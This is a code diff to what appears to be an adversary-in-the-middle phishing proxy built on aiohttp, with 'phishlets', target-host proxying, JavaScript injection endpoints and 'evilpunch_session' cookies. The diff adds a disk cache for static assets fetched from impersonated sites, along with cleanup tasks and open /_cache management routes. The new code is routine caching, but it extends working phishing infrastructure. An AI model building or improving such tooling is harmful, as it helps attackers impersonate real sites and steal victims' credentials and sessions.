@@ -7,6 +7,8 @@ import subprocess
 import time
 import logging
 import traceback
+import hashlib
+import mimetypes
 # errno is not needed; we detect EADDRINUSE via message patterns
 from pathlib import Path
 from typing import Optional, Dict, Any, Tuple, List
@@ -39,6 +41,422 @@ FALLBACK_HTTP_PORT = int(os.getenv("PROXY_FALLBACK_PORT", "8080"))
 # Debug configuration
 DEBUG_MODE = os.getenv("PROXY_DEBUG", "true").lower() == "true"
 DEBUG_LEVEL = os.getenv("PROXY_DEBUG_LEVEL", "INFO").upper()
+
+# --- STATIC FILE CACHING ---
+# Cache configuration can be controlled via environment variables:
+# STATIC_CACHE_ENABLED: Enable/disable caching (default: true)
+# STATIC_CACHE_MAX_SIZE_MB: Maximum cache size in MB (default: 100)
+# STATIC_CACHE_MAX_AGE_HOURS: Maximum age of cached files in hours (default: 24)
+CACHE_FOLDER = os.path.join(BASE_DIR, "cache_folder")
+CACHE_ENABLED = os.getenv("STATIC_CACHE_ENABLED", "true").lower() == "true"
+CACHE_MAX_SIZE_MB = int(os.getenv("STATIC_CACHE_MAX_SIZE_MB", "100"))  # 100MB default
+CACHE_MAX_AGE_HOURS = int(os.getenv("STATIC_CACHE_MAX_AGE_HOURS", "24"))  # 24 hours default
+
+# Ensure cache folder exists
+os.makedirs(CACHE_FOLDER, exist_ok=True)
+
+# Cache statistics
+_cache_stats = {
+    "hits": 0,
+    "misses": 0,
+    "writes": 0,
+    "total_size_bytes": 0
+}
+
+def _get_cache_path(phishlet_name: str, url_path: str, target_host: str) -> Path:
+    """
+    Generate cache file path based on phishlet name, URL path, and target host.
+    Creates a unique filename using hash of the full URL.
+    """
+    try:
+        # Clean phishlet name for filesystem safety
+        safe_phishlet_name = "".join(c for c in phishlet_name if c.isalnum() or c in ('-', '_')).rstrip()
+        if not safe_phishlet_name:
+            safe_phishlet_name = "unknown_phishlet"
+        
+        # Create phishlet-specific cache directory
+        phishlet_cache_dir = Path(CACHE_FOLDER) / safe_phishlet_name
+        phishlet_cache_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Create hash of the full URL for unique filename
+        full_url = f"{target_host}{url_path}"
+        url_hash = hashlib.md5(full_url.encode('utf-8')).hexdigest()
+        
+        # Get file extension from URL path
+        file_ext = ""
+        if '.' in url_path:
+            file_ext = url_path.split('.')[-1]
+            if len(file_ext) > 10:  # Sanity check for extension length
+                file_ext = ""
+        
+        # Create filename with hash and extension
+        if file_ext:
+            filename = f"{url_hash}.{file_ext}"
+        else:
+            filename = url_hash
+        
+        cache_file_path = phishlet_cache_dir / filename
+        
+        # Create metadata file path
+        metadata_file_path = phishlet_cache_dir / f"{url_hash}.meta"
+        
+        return cache_file_path, metadata_file_path
+        
+    except Exception as e:
+        debug_log(f"Error generating cache path: {e}", "ERROR")
+        return None, None
+
+def _is_cacheable_file(url_path: str, content_type: str) -> bool:
+    """
+    Check if a file should be cached based on URL path and content type.
+    """
+    try:
+        # Check file extension
+        static_extensions = [
+            '.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', 
+            '.woff', '.woff2', '.ttf', '.eot', '.webp', '.mp4', '.mp3', 
+            '.pdf', '.zip', '.rar', '.tar', '.gz', '.xml', '.json'
+        ]
+        
+        has_static_extension = any(url_path.lower().endswith(ext) for ext in static_extensions)
+        
+        # Check content type
+        cacheable_content_types = [
+            'text/css', 'application/javascript', 'image/', 'font/', 
+            'audio/', 'video/', 'application/pdf', 'application/json',
+            'text/xml', 'application/xml'
+        ]
+        
+        has_cacheable_content = any(ct in content_type.lower() for ct in cacheable_content_types)
+        
+        # Cache if either condition is met
+        return has_static_extension or has_cacheable_content
+        
+    except Exception as e:
+        debug_log(f"Error checking cacheability: {e}", "ERROR")
+        return False
+
+def _get_cache_metadata(metadata_file_path: Path) -> Optional[Dict[str, Any]]:
+    """
+    Read cache metadata from file.
+    """
+    try:
+        if metadata_file_path.exists():
+            import json
+            with open(metadata_file_path, 'r', encoding='utf-8') as f:
+                metadata = json.load(f)
+            return metadata
+    except Exception as e:
+        debug_log(f"Error reading cache metadata: {e}", "ERROR")
+    return None
+
+def _write_cache_metadata(metadata_file_path: Path, metadata: Dict[str, Any]):
+    """
+    Write cache metadata to file.
+    """
+    try:
+        import json
+        with open(metadata_file_path, 'w', encoding='utf-8') as f:
+            json.dump(metadata, f, indent=2)
+    except Exception as e:
+        debug_log(f"Error writing cache metadata: {e}", "ERROR")
+
+def _is_cache_valid(metadata: Dict[str, Any]) -> bool:
+    """
+    Check if cached file is still valid based on age and size.
+    """
+    try:
+        import time
+        current_time = time.time()
+        cache_time = metadata.get('cache_time', 0)
+        max_age_seconds = CACHE_MAX_AGE_HOURS * 3600
+        
+        # Check if cache is too old
+        if current_time - cache_time > max_age_seconds:
+            debug_log(f"Cache expired: {current_time - cache_time:.1f}s > {max_age_seconds}s", "DEBUG")
+            return False
+        
+        # Check if file still exists and size matches
+        cache_file_path = Path(metadata.get('cache_file_path', ''))
+        if not cache_file_path.exists():
+            debug_log("Cache file no longer exists", "DEBUG")
+            return False
+        
+        current_size = cache_file_path.stat().st_size
+        cached_size = metadata.get('file_size', 0)
+        
+        if current_size != cached_size:
+            debug_log(f"Cache file size mismatch: {current_size} != {cached_size}", "DEBUG")
+            return False
+        
+        return True
+        
+    except Exception as e:
+        debug_log(f"Error checking cache validity: {e}", "ERROR")
+        return False
+
+def _write_to_cache(cache_file_path: Path, content: bytes, metadata_file_path: Path, 
+                    url_path: str, target_host: str, content_type: str, phishlet_name: str):
+    """
+    Write file content to cache and update metadata.
+    """
+    try:
+        # Write file content
+        with open(cache_file_path, 'wb') as f:
+            f.write(content)
+        
+        # Create metadata
+        import time
+        metadata = {
+            'url_path': url_path,
+            'target_host': target_host,
+            'phishlet_name': phishlet_name,
+            'content_type': content_type,
+            'file_size': len(content),
+            'cache_time': time.time(),
+            'cache_file_path': str(cache_file_path),
+            'last_accessed': time.time()
+        }
+        
+        # Write metadata
+        _write_cache_metadata(metadata_file_path, metadata)
+        
+        # Update cache statistics
+        _cache_stats['writes'] += 1
+        _cache_stats['total_size_bytes'] += len(content)
+        
+        debug_log(f"✅ Cached static file: {url_path} ({len(content)} bytes)", "INFO")
+        debug_log(f"   Cache location: {cache_file_path}", "DEBUG")
+        
+    except Exception as e:
+        debug_log(f"Error writing to cache: {e}", "ERROR")
+
+def _read_from_cache(cache_file_path: Path, metadata_file_path: Path) -> Optional[Tuple[bytes, Dict[str, Any]]]:
+    """
+    Read file content from cache and update access time.
+    """
+    try:
+        # Read file content
+        with open(cache_file_path, 'rb') as f:
+            content = f.read()
+        
+        # Read and update metadata
+        metadata = _get_cache_metadata(metadata_file_path)
+        if metadata:
+            import time
+            metadata['last_accessed'] = time.time()
+            _write_cache_metadata(metadata_file_path, metadata)
+            
+            # Update cache statistics
+            _cache_stats['hits'] += 1
+            
+            debug_log(f"✅ Cache HIT: {metadata.get('url_path', 'unknown')} ({len(content)} bytes)", "INFO")
+            return content, metadata
+        
+    except Exception as e:
+        debug_log(f"Error reading from cache: {e}", "ERROR")
+    
+    return None
+
+def _cleanup_cache():
+    """
+    Clean up old cache files to maintain size limits.
+    """
+    try:
+        import time
+        current_time = time.time()
+        max_age_seconds = CACHE_MAX_AGE_HOURS * 3600
+        max_size_bytes = CACHE_MAX_SIZE_MB * 1024 * 1024
+        
+        debug_log("Starting cache cleanup...", "DEBUG")
+        
+        # Collect all cache files with metadata
+        cache_files = []
+        for phishlet_dir in Path(CACHE_FOLDER).iterdir():
+            if phishlet_dir.is_dir():
+                for meta_file in phishlet_dir.glob("*.meta"):
+                    try:
+                        metadata = _get_cache_metadata(meta_file)
+                        if metadata:
+                            cache_file_path = Path(metadata.get('cache_file_path', ''))
+                            if cache_file_path.exists():
+                                cache_files.append((cache_file_path, meta_file, metadata))
+                    except Exception as e:
+                        debug_log(f"Error processing metadata file {meta_file}: {e}", "DEBUG")
+        
+        # Sort by last accessed time (oldest first)
+        cache_files.sort(key=lambda x: x[2].get('last_accessed', 0))
+        
+        # Remove old files first
+        for cache_file, meta_file, metadata in cache_files:
+            if current_time - metadata.get('cache_time', 0) > max_age_seconds:
+                try:
+                    cache_file.unlink()
+                    meta_file.unlink()
+                    debug_log(f"Removed expired cache file: {metadata.get('url_path', 'unknown')}", "DEBUG")
+                except Exception as e:
+                    debug_log(f"Error removing expired cache file: {e}", "DEBUG")
+        
+        # Check total size and remove oldest if needed
+        total_size = sum(Path(metadata.get('cache_file_path', '')).stat().st_size 
+                        for _, _, metadata in cache_files 
+                        if Path(metadata.get('cache_file_path', '')).exists())
+        
+        if total_size > max_size_bytes:
+            debug_log(f"Cache size {total_size / (1024*1024):.1f}MB exceeds limit {CACHE_MAX_SIZE_MB}MB", "INFO")
+            
+            # Remove oldest files until under limit
+            for cache_file, meta_file, metadata in cache_files:
+                if total_size <= max_size_bytes:
+                    break
+                    
+                try:
+                    file_size = cache_file.stat().st_size
+                    cache_file.unlink()
+                    meta_file.unlink()
+                    total_size -= file_size
+                    debug_log(f"Removed old cache file to free space: {metadata.get('url_path', 'unknown')}", "DEBUG")
+                except Exception as e:
+                    debug_log(f"Error removing old cache file: {e}", "DEBUG")
+        
+        debug_log(f"Cache cleanup complete. Total size: {total_size / (1024*1024):.1f}MB", "DEBUG")
+        
+    except Exception as e:
+        debug_log(f"Error during cache cleanup: {e}", "ERROR")
+
+def get_cache_config() -> Dict[str, Any]:
+    """
+    Get cache configuration.
+    """
+    return {
+        'enabled': CACHE_ENABLED,
+        'cache_folder': CACHE_FOLDER,
+        'max_size_mb': CACHE_MAX_SIZE_MB,
+        'max_age_hours': CACHE_MAX_AGE_HOURS,
+        'environment_variables': {
+            'STATIC_CACHE_ENABLED': os.getenv("STATIC_CACHE_ENABLED", "true"),
+            'STATIC_CACHE_MAX_SIZE_MB': os.getenv("STATIC_CACHE_MAX_SIZE_MB", "100"),
+            'STATIC_CACHE_MAX_AGE_HOURS': os.getenv("STATIC_CACHE_MAX_AGE_HOURS", "24")
+        }
+    }
+
+def get_cache_stats() -> Dict[str, Any]:
+    """
+    Get cache statistics.
+    """
+    total_size_mb = _cache_stats['total_size_bytes'] / (1024 * 1024)
+    hit_rate = (_cache_stats['hits'] / (_cache_stats['hits'] + _cache_stats['misses'])) * 100 if (_cache_stats['hits'] + _cache_stats['misses']) > 0 else 0
+    
+    # Get actual cache directory information
+    cache_info = {}
+    try:
+        if Path(CACHE_FOLDER).exists():
+            phishlet_dirs = [d for d in Path(CACHE_FOLDER).iterdir() if d.is_dir()]
+            cache_info['phishlet_directories'] = len(phishlet_dirs)
+            
+            total_files = 0
+            total_actual_size = 0
+            
+            for phishlet_dir in phishlet_dirs:
+                phishlet_files = [f for f in phishlet_dir.iterdir() if f.is_file() and f.suffix != '.meta']
+                total_files += len(phishlet_files)
+                
+                for cache_file in phishlet_files:
+                    try:
+                        total_actual_size += cache_file.stat().st_size
+                    except:
+                        pass
+            
+            cache_info['total_cached_files'] = total_files
+            cache_info['actual_size_mb'] = round(total_actual_size / (1024 * 1024), 2)
+        else:
+            cache_info['phishlet_directories'] = 0
+            cache_info['total_cached_files'] = 0
+            cache_info['actual_size_mb'] = 0
+    except Exception as e:
+        debug_log(f"Error getting cache directory info: {e}", "DEBUG")
+        cache_info['error'] = str(e)
+    
+    return {
+        'hits': _cache_stats['hits'],
+        'misses': _cache_stats['misses'],
+        'writes': _cache_stats['writes'],
+        'total_size_mb': round(total_size_mb, 2),
+        'hit_rate_percent': round(hit_rate, 2),
+        'enabled': CACHE_ENABLED,
+        'max_size_mb': CACHE_MAX_SIZE_MB,
+        'max_age_hours': CACHE_MAX_AGE_HOURS,
+        'cache_folder': CACHE_FOLDER,
+        'cache_info': cache_info,
+        'configuration': get_cache_config()
+    }
+
+def get_cache_directory_info() -> Dict[str, Any]:
+    """
+    Get detailed information about cache directory structure.
+    """
+    try:
+        cache_info = {
+            'cache_folder': CACHE_FOLDER,
+            'phishlets': {}
+        }
+        
+        if Path(CACHE_FOLDER).exists():
+            for phishlet_dir in Path(CACHE_FOLDER).iterdir():
+                if phishlet_dir.is_dir():
+                    phishlet_name = phishlet_dir.name
+                    phishlet_info = {
+                        'directory': str(phishlet_dir),
+                        'cache_files': 0,
+                        'metadata_files': 0,
+                        'total_size_bytes': 0,
+                        'files': []
+                    }
+                    
+                    for cache_file in phishlet_dir.iterdir():
+                        if cache_file.is_file():
+                            try:
+                                file_size = cache_file.stat().st_size
+                                if cache_file.suffix == '.meta':
+                                    phishlet_info['metadata_files'] += 1
+                                    # Try to read metadata for more info
+                                    try:
+                                        metadata = _get_cache_metadata(cache_file)
+                                        if metadata:
+                                            phishlet_info['files'].append({
+                                                'name': cache_file.name,
+                                                'type': 'metadata',
+                                                'size_bytes': file_size,
+                                                'url_path': metadata.get('url_path', 'unknown'),
+                                                'target_host': metadata.get('target_host', 'unknown'),
+                                                'cache_time': metadata.get('cache_time', 0),
+                                                'last_accessed': metadata.get('last_accessed', 0)
+                                            })
+                                    except:
+                                        phishlet_info['files'].append({
+                                            'name': cache_file.name,
+                                            'type': 'metadata',
+                                            'size_bytes': file_size
+                                        })
+                                else:
+                                    phishlet_info['cache_files'] += 1
+                                    phishlet_info['total_size_bytes'] += file_size
+                                    phishlet_info['files'].append({
+                                        'name': cache_file.name,
+                                        'type': 'cache',
+                                        'size_bytes': file_size
+                                    })
+                            except Exception as e:
+                                debug_log(f"Error processing cache file {cache_file}: {e}", "DEBUG")
+                    
+                    phishlet_info['total_size_mb'] = round(phishlet_info['total_size_bytes'] / (1024 * 1024), 2)
+                    cache_info['phishlets'][phishlet_name] = phishlet_info
+        
+        return cache_info
+        
+    except Exception as e:
+        debug_log(f"Error getting cache directory info: {e}", "ERROR")
+        return {'error': str(e)}
 
 # --- JAVASCRIPT INJECTION ---
 # Store temporary JavaScript endpoints: {endpoint_id: js_code}
@@ -1325,6 +1743,119 @@ async def temp_js_handler(request):
     return web.Response(text=js_code, headers=headers)
 
 
+async def cache_stats_handler(request):
+    """
+    Handler for cache statistics endpoint.
+    Returns JSON with cache statistics.
+    """
+    try:
+        stats = get_cache_stats()
+        return web.json_response(stats)
+    except Exception as e:
+        debug_log(f"Error getting cache stats: {e}", "ERROR")
+        return web.json_response({"error": str(e)}, status=500)
+
+async def cache_directory_handler(request):
+    """
+    Handler for cache directory information endpoint.
+    Returns JSON with detailed cache directory structure.
+    """
+    try:
+        directory_info = get_cache_directory_info()
+        return web.json_response(directory_info)
+    except Exception as e:
+        debug_log(f"Error getting cache directory info: {e}", "ERROR")
+        return web.json_response({"error": str(e)}, status=500)
+
+async def cache_config_handler(request):
+    """
+    Handler for cache configuration endpoint.
+    Returns JSON with cache configuration.
+    """
+    try:
+        config = get_cache_config()
+        return web.json_response(config)
+    except Exception as e:
+        debug_log(f"Error getting cache config: {e}", "ERROR")
+        return web.json_response({"error": str(e)}, status=500)
+
+async def cache_clear_handler(request):
+    """
+    Handler for clearing all cache.
+    Returns JSON with operation result.
+    """
+    try:
+        debug_log("Cache clear requested", "INFO")
+        
+        # Clear all cache files
+        cleared_count = 0
+        total_size_cleared = 0
+        
+        for phishlet_dir in Path(CACHE_FOLDER).iterdir():
+            if phishlet_dir.is_dir():
+                for cache_file in phishlet_dir.iterdir():
+                    if cache_file.is_file():
+                        try:
+                            if cache_file.suffix == '.meta':
+                                # Get file size before deletion for stats
+                                try:
+                                    metadata = _get_cache_metadata(cache_file)
+                                    if metadata:
+                                        total_size_cleared += metadata.get('file_size', 0)
+                                except:
+                                    pass
+                            
+                            cache_file.unlink()
+                            cleared_count += 1
+                        except Exception as e:
+                            debug_log(f"Error removing cache file {cache_file}: {e}", "DEBUG")
+        
+        # Reset cache statistics
+        global _cache_stats
+        _cache_stats = {
+            "hits": 0,
+            "misses": 0,
+            "writes": 0,
+            "total_size_bytes": 0
+        }
+        
+        debug_log(f"Cache cleared: {cleared_count} files, {total_size_cleared / (1024*1024):.2f}MB freed", "INFO")
+        
+        return web.json_response({
+            "success": True,
+            "message": f"Cache cleared: {cleared_count} files, {total_size_cleared / (1024*1024):.2f}MB freed",
+            "cleared_files": cleared_count,
+            "size_freed_mb": round(total_size_cleared / (1024*1024), 2)
+        })
+        
+    except Exception as e:
+        debug_log(f"Error clearing cache: {e}", "ERROR")
+        return web.json_response({"error": str(e)}, status=500)
+
+async def cache_cleanup_handler(request):
+    """
+    Handler for manual cache cleanup.
+    Returns JSON with operation result.
+    """
+    try:
+        debug_log("Manual cache cleanup requested", "INFO")
+        
+        # Run cleanup
+        await asyncio.to_thread(_cleanup_cache)
+        
+        # Get updated stats
+        stats = get_cache_stats()
+        
+        return web.json_response({
+            "success": True,
+            "message": "Cache cleanup completed",
+            "stats": stats
+        })
+        
+    except Exception as e:
+        debug_log(f"Error in manual cache cleanup: {e}", "ERROR")
+        return web.json_response({"error": str(e)}, status=500)
+
 async def proxy_handler(request):
     debug_log("=== PROXY REQUEST HANDLER ===", "DEBUG")
     debug_log(f"Request method: {request.method}", "DEBUG")
@@ -1724,6 +2255,113 @@ async def proxy_handler(request):
                 else:
                     debug_log(f"⏭️  Content type '{content_type}' - skipping replacements (binary/non-text)", "DEBUG")
                 
+                # === STATIC FILE CACHING ===
+                # Check if this is a cacheable static file
+                should_cache = False
+                cache_file_path = None
+                metadata_file_path = None
+                
+                if (CACHE_ENABLED and 
+                    matching_phishlet and 
+                    matching_phishlet.get('name') and
+                    _is_cacheable_file(url_path, content_type)):
+                    
+                    should_cache = True
+                    phishlet_name = matching_phishlet['name']
+                    
+                    # Generate cache paths
+                    cache_paths = _get_cache_path(phishlet_name, url_path, target_host)
+                    if cache_paths:
+                        cache_file_path, metadata_file_path = cache_paths
+                        
+                        # Check if we have a valid cached version
+                        if cache_file_path and metadata_file_path:
+                            cached_content = _read_from_cache(cache_file_path, metadata_file_path)
+                            if cached_content:
+                                cached_bytes, cached_metadata = cached_content
+                                
+                                # Check if cached content is still valid
+                                if _is_cache_valid(cached_metadata):
+                                    debug_log(f"🎯 Serving from cache: {url_path} ({len(cached_bytes)} bytes)", "INFO")
+                                    
+                                    # Create basic headers for cached response
+                                    # We need to create headers that would normally come from the upstream response
+                                    cached_headers = {
+                                        'Content-Type': content_type,
+                                        'Cache-Control': 'public, max-age=3600',
+                                        'Content-Length': str(len(cached_bytes))
+                                    }
+                                    
+                                    # Add any additional headers that might be needed
+                                    if 'text/html' in content_type:
+                                        cached_headers['Content-Type'] = 'text/html; charset=utf-8'
+                                    elif 'text/css' in content_type:
+                                        cached_headers['Content-Type'] = 'text/css; charset=utf-8'
+                                    elif 'application/javascript' in content_type:
+                                        cached_headers['Content-Type'] = 'application/javascript; charset=utf-8'
+                                    
+                                    # Create response with cached content
+                                    response = web.Response(
+                                        body=cached_bytes,
+                                        status=200,
+                                        headers=cached_headers
+                                    )
+                                    
+                                    # Add session cookie if we have session info
+                                    if hasattr(request, 'get') and request.get('session_cookie'):
+                                        session_cookie = request['session_cookie']
+                                        phishlet_id = request.get('phishlet_id')
+                                        proxy_domain = request.get('proxy_domain', '')
+                                        
+                                        # Set cookie with appropriate attributes
+                                        cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
+                                        
+                                        # Set cookie domain to base domain for cross-subdomain access
+                                        base_domain = proxy_domain
+                                        if '.' in base_domain:
+                                            base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
+                                        
+                                        response.set_cookie(
+                                            cookie_name,
+                                            session_cookie,
+                                            max_age=31536000,  # 1 year
+                                            httponly=True,
+                                            secure=False,
+                                            samesite='Lax',
+                                            domain=f'.{base_domain}'
+                                        )
+                                        debug_log(f"Added session cookie to cached response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
+                                    
+                                    return response
+                                else:
+                                    debug_log(f"⚠️  Cached file expired or invalid: {url_path}", "DEBUG")
+                                    # Remove invalid cache files
+                                    try:
+                                        if cache_file_path.exists():
+                                            cache_file_path.unlink()
+                                        if metadata_file_path.exists():
+                                            metadata_file_path.unlink()
+                                        debug_log(f"Removed invalid cache files for: {url_path}", "DEBUG")
+                                    except Exception as e:
+                                        debug_log(f"Error removing invalid cache files: {e}", "DEBUG")
+                            else:
+                                debug_log(f"⏭️  Cache miss for: {url_path}", "DEBUG")
+                                _cache_stats['misses'] += 1
+                        else:
+                            debug_log(f"⚠️  Could not generate cache paths for: {url_path}", "DEBUG")
+                    else:
+                        debug_log(f"⚠️  Could not generate cache paths for: {url_path}", "DEBUG")
+                else:
+                    if not CACHE_ENABLED:
+                        debug_log(f"⏭️  Caching disabled for: {url_path}", "DEBUG")
+                    elif not matching_phishlet or not matching_phishlet.get('name'):
+                        debug_log(f"⏭️  No phishlet info for caching: {url_path}", "DEBUG")
+                    elif not _is_cacheable_file(url_path, content_type):
+                        debug_log(f"⏭️  File not cacheable: {url_path} (type: {content_type})", "DEBUG")
+                
+                debug_log(f"Cache decision for {url_path}: {'CACHE' if should_cache else 'NO_CACHE'}", "DEBUG")
+                # === END STATIC FILE CACHING ===
+                
                 # Patch response headers
                 patched_headers = patch_headers_in(resp.headers, incoming_host, target_host)
                 for h in ("content-length", "Content-Length", "content-encoding", "Content-Encoding"):
@@ -1935,6 +2573,58 @@ async def proxy_handler(request):
                         debug_log(f"   Chunk size: 4096 bytes", "INFO")
                         debug_log(f"   Expected content replacement: {'No' if is_static_file else 'Yes'}", "INFO")
                     
+                    # === STATIC FILE CACHING - COLLECT CONTENT ===
+                    # If this is a cacheable file, collect all content for caching
+                    cache_content = b""
+                    if should_cache and cache_file_path and metadata_file_path:
+                        debug_log(f"📦 Collecting content for caching: {url_path}", "INFO")
+                        # Read all content from response for caching
+                        async for content_chunk in resp.content.iter_chunked(4096):
+                            cache_content += content_chunk
+                        
+                        # Cache the collected content
+                        if cache_content:
+                            phishlet_name = matching_phishlet['name'] if matching_phishlet else "unknown"
+                            _write_to_cache(
+                                cache_file_path, 
+                                cache_content, 
+                                metadata_file_path, 
+                                url_path, 
+                                target_host, 
+                                content_type, 
+                                phishlet_name
+                            )
+                            
+                            # Now stream the cached content to the client
+                            debug_log(f"📤 Streaming cached content to client: {url_path} ({len(cache_content)} bytes)", "INFO")
+                            
+                            # Stream the cached content in chunks
+                            chunk_size = 4096
+                            for i in range(0, len(cache_content), chunk_size):
+                                chunk = cache_content[i:i + chunk_size]
+                                try:
+                                    await stream_response.write(chunk)
+                                except Exception as write_error:
+                                    if "Cannot write to closing transport" in str(write_error):
+                                        debug_log("Client disconnected during cached content streaming", "WARN")
+                                        break
+                                    else:
+                                        raise write_error
+                            
+                            # Write EOF and return
+                            if request.transport and not request.transport.is_closing():
+                                try:
+                                    await stream_response.write_eof()
+                                    debug_log(f"Cached content streaming complete: {len(cache_content)} bytes", "INFO")
+                                except Exception as write_error:
+                                    if "Cannot write to closing transport" in str(write_error):
+                                        debug_log("Client disconnected during EOF write", "WARN")
+                                    else:
+                                        raise write_error
+                            
+                            return stream_response
+                    
+                    # If not caching, continue with normal streaming
                     async for chunk in resp.content.iter_chunked(4096):
                         # Check if client is still connected before processing each chunk
                         if request.transport and request.transport.is_closing():
@@ -2272,6 +2962,24 @@ async def _start_and_wait(stop_event: threading.Event, *, port: int) -> None:
     debug_log("=== STARTING PROXY SERVER ===", "INFO")
     debug_log(f"Target port: {port}", "INFO")
     
+    # Start cache cleanup task
+    if CACHE_ENABLED:
+        debug_log("Starting cache cleanup task...", "INFO")
+        
+        async def cache_cleanup_task():
+            while not stop_event.is_set():
+                try:
+                    await asyncio.sleep(3600)  # Run every hour
+                    if not stop_event.is_set():
+                        debug_log("Running periodic cache cleanup...", "DEBUG")
+                        await asyncio.to_thread(_cleanup_cache)
+                except Exception as e:
+                    debug_log(f"Error in cache cleanup task: {e}", "ERROR")
+        
+        # Start cache cleanup task
+        cleanup_task = asyncio.create_task(cache_cleanup_task())
+        debug_log("✅ Cache cleanup task started", "INFO")
+    
     ssl_context = await _build_ssl_context()
     port_to_use = port
     
@@ -2280,6 +2988,15 @@ async def _start_and_wait(stop_event: threading.Event, *, port: int) -> None:
         port_to_use = FALLBACK_HTTP_PORT
 
     app = web.Application()
+    
+    # Add route for cache statistics and management
+    app.router.add_route('GET', '/_cache/config', cache_config_handler)
+    app.router.add_route('GET', '/_cache/stats', cache_stats_handler)
+    app.router.add_route('GET', '/_cache/directory', cache_directory_handler)
+    app.router.add_route('POST', '/_cache/clear', cache_clear_handler)
+    app.router.add_route('POST', '/_cache/cleanup', cache_cleanup_handler)
+    debug_log("✅ Cache management routes registered: GET,POST /_cache/*", "INFO")
+    
     # Add route for temporary JavaScript endpoints (MUST be before catch-all)
     # Use more specific pattern to avoid conflicts
     app.router.add_route('GET', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
